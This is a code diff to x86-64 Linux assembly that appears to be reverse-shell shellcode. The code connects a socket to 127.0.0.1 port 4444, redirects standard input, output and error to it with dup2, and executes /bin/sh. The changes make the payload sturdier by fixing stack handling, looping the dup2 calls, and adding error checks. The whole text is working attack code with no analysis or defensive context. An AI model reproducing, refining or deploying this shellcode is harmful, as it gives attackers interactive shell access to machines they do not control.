@@ -16,40 +16,43 @@ _start:
     js exit
     mov rbx, rax
 
-    push rdx
-    mov dword [rsp-4], 0x0100007f
-    mov word [rsp-6], 0x5c11
-    mov byte [rsp-8], 2
-    sub rsp, 8
+    mov r12, rsp
+    sub rsp, 16
+    mov rsi, rsp
+    mov word [rsi], 2
+    mov word [rsi + 2], 0x5c11
+    mov dword [rsi + 4], 0x0100007f
+
     mov rax, 42
     mov rdi, rbx
-    mov rsi, rsp
     mov dl, 16
     syscall
     test rax, rax
     js exit
-    add rsp, 16
+    mov rsp, r12
 
+    xor rsi, rsi
+dup_loop:
     mov rax, 33
     mov rdi, rbx
-    xor rsi, rsi
     syscall
-    mov rax, 33
+    test rax, rax
+    js exit
     inc rsi
-    syscall
-    mov rax, 33
-    inc rsi
-    syscall
+    cmp rsi, 3
+    jl dup_loop
 
     xor rax, rax
     push rax
     mov rbx, 0x68732f6e69622f2f
     push rbx
     mov rdi, rsp
-    mov al, 59
     xor rsi, rsi
     xor rdx, rdx
+    mov al, 59
     syscall
+    test rax, rax
+    js exit
 
 exit:
     mov rax, 60
